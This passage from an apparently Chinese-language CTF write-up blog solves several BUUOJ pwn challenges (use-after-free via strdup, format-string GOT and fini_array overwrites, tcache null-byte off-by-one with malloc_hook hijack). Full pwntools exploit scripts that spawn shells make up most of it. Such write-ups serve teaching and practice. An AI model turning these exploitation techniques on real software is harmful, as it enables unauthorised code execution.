punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"picoctf_2018_are_you_root\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_are_you_root\">#</a> PicoCTF_2018_are_you_root</h1>\n<p>** 考点：**uaf, strdup</p>\n<p><strong>重点！</strong> strdup 会新建一个堆块以复制字符串。</p>\n<p>该题会分配一个 0x10 大小的 note chunk 用于管理用户名和权限。用户名是将输入的字符串用 <code>strdup()</code>  复制后将地址写入 note chunk 中。重置账户功能会释放 strdup 分配的 chunk。</p>\n<p>因此我们第一次输入的用户名为 0x10 大小，并且在其 + 8 的位置输入 <code>p64(5)</code> 。</p>\n<p>这样重置用户然后再次登录，这时管理用户的 note chunk 就会分配为刚刚 strdup 分配的块。由于写入的 5 数据没有被抹除，所以此时账号为权限 5，可以直接读取 flag。</p>\n<pre><code class=\"language-pyhon\">#!/usr/bin/python3\nfrom pwn import *\ncontext(arch='amd64', log_level='debug')\n\nfilename = 'PicoCTF_2018_are_you_root'\nmode = int(sys.argv[1]) if len(sys.argv)&gt;1 else 0\np = process('./'+filename+'_pe') if mode else remote('node4.buuoj.cn',25967)\ne = ELF('./'+filename+'_pe') if mode else ELF('./'+filename)\n\nif mode==2:\n    gdb.attach(p, 'b ')\n\ncmdlist = ['','show','login','set_auth', 'get-flag','reset','quit']\ndef cmd(index, content=b''):\n    payload = cmdlist[index].encode() + b' ' + content\n    p.sendlineafter(b'command:', payload)\n\ncmd(2, b'a'*8+p64(5))\ncmd(5)\ncmd(2, b'getshell!')\ncmd(4)\n\np.interactive()\n</code></pre>\n<h1 id=\"xman_2019_format\"><a class=\"markdownIt-Anchor\" href=\"#xman_2019_format\">#</a> xman_2019_format</h1>\n<p>** 考点：**fmtstr, 爆破</p>\n<p>** 版本：**32 位</p>\n<p>存在后门函数。</p>\n<p>利用 ebp 作跳板，修改 <code>0xffe16cf8</code>  处的数据为 rip 的地址，然后再修改 rip 为后门函数地址。这样可以只修改一个或两个字节。但是栈上地址是随机的，只能确定地址最后一位为 0xc，倒数第二位爆破即可。</p>\n<p><img data-src=\"./image-20231121213657165.png\" alt=\"image-20231121213657165\"></p>\n<p>ebp 对应的参数位置。 <code>index=(0xffe16cd8-0xffe16cb0)//4 =0xa=10</code></p>\n<p>6cf8 对应参数位置。 <code>index=(0xffe16cf8-0xffe16cb0)//4 =0x12=18</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x80485b4</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fmtstrhh</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">'%&#123;&#125;c%&#123;&#125;$hhn'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">&amp;</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> payload<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fmtstrh</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">'%&#123;&#125;c%&#123;&#125;$hn'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> payload<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10c</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">#p=process('./xman_2019_format_pe')</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25040</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'i:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        p1 <span class=\"token operator\">=</span> fmtstrhh<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        p2 <span class=\"token operator\">=</span> fmtstrh<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        payload <span class=\"token operator\">=</span>  <span class=\"token string\">b'|'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p1<span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>可以尝试修改 got 表，但是由于同时修改四字节，输出过多，因此只有本地打得通。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context(log_level='debug')</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./xman_2019_format'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./xman_2019_format_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',27985)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>printf_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sys_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x80485AB</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fmtstr</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">'%&#123;&#125;c%&#123;&#125;$n'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">return</span> payload<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>     </pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p1 <span class=\"token operator\">=</span> fmtstr<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> printf_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p2 <span class=\"token operator\">=</span> fmtstr<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p3 <span class=\"token operator\">=</span> <span class=\"token string\">b'getshell'</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload <span class=\"token operator\">=</span>  <span class=\"token string\">b'|'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p1<span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">,</span>p3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ciscn_2019_sw_1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_sw_1\">#</a> *ciscn_2019_sw_1</h1>\n<p><strong>考点：</strong> fmtstr, fini_array</p>\n<p>** 版本：**libc6_2.27 amd64</p>\n<p>只开启了 nx 保护，所以可以知道任何程序本身的地址。</p>\n<p>从第 4 个参数开始为字符串所在位置。</p>\n<p><img data-src=\"./image-20231127013447501.png\" alt=\"image-20231127013447501\"></p>\n<p>该程序只有一次执行格式化漏洞的机会，而栈上已有地址也没有啥能利用的。</p>\n<p>该版本下，主函数执行完， <code>__libc_start_main</code>  函数会执行一次 fini_array。所以虽然不知道栈上地址以至于不能修改 rip 地址，但可以利用 fini_array 跳转到任意地址。</p>\n<p>原先想跳转到后门函数 <code>_sys</code>  的，但其利用的参数 <code>command</code>  为常量不可读写，所以最后采用在修改 fini_array 的同时修改 printf 的 got 表为 system 的 plt 地址，在 fini_array 跳转到 main 函数时便获得了第二次利用 printf 的机会。此时输入 <code>/bin/sh</code>  便可以 getshell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ciscn_2019_sw_1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ciscn_2019_sw_1_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',29536)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>backdoor <span class=\"token operator\">=</span> <span class=\"token number\">0x0804851B</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>cmd <span class=\"token operator\">=</span> <span class=\"token number\">0x08048640</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>fini <span class=\"token operator\">=</span> <span class=\"token number\">0x0804979C</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>printf_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sys_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>printf_g<span class=\"token punctuation\">:</span>sys_p<span class=\"token punctuation\">,</span> fini<span class=\"token punctuation\">:</span>p16<span class=\"token punctuation\">(</span>main_a<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>write_size<span class=\"token operator\">=</span><span class=\"token string\">'short'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name?\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里覆盖 fini_array 的地址覆盖低二位字节就好。</p>\n<img data-src=\"./image-20231127150741779.png\" alt=\"image-20231127150741779\" style=\"zoom:50%;\" />\n<h1 id=\"hitcon_2018_children_tcache\"><a class=\"markdownIt-Anchor\" href=\"#hitcon_2018_children_tcache\">#</a> hitcon_2018_children_tcache</h1>\n<p>** 考点：**tcache dup, overlap extend, null byte off by one</p>\n<p>** 版本：**libc6_2.27</p>\n<p>保护全开。free 后清空地址。</p>\n<p>程序用 strcpy 将字符串复制到块上，存在 null byte off by one 漏洞。在两个大 chunk 中夹一个小 chunk，利用小 chunk 修改大 chunk 的 inuse 标志，使得释放后能构成块重叠。</p>\n<p>由于用的是 strcpy 复制的字符串，因此遇到 <code>'\\0'</code>  便会停止，同时每次 free 时都会根据 malloc 时用户输入的 size 将 chunk 用 <code>'\\xba'</code>  填充，因此需要逐步设置最后属于 prevsize 的 8 个字节。</p>\n<p>构造块重叠后，先后将头尾两个大 chunk 释放，此时会合并两个 chunk 为一个，而小 chunk 位于中间。这时候分配与原先第二个 chunk 大小相同的 chunk，这时候 unsorted chunk 的开头便与小 chunk 开头重叠，这时候输出小 chunk，便可以泄露 mainarena 地址。</p>\n<p>随后修改 malloc_hook 为 one_gadget 地址便可。</p>\n<p>one_gadget 选第二个或第三个均可。</p>\n<img data-src=\"./image-20231127202549017.png\" alt=\"image-20231127202549017\" style=\"zoom:50%;\" />\n<img data-src=\"./image-20231127202604983.png\" alt=\"image-20231127202604983\" style=\"zoom: 67%;\" />\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'HITCON_2018_children_tcache'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/ctftools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25532</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0x00FDF)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Data:'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    mal<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x440</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2 (1)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token 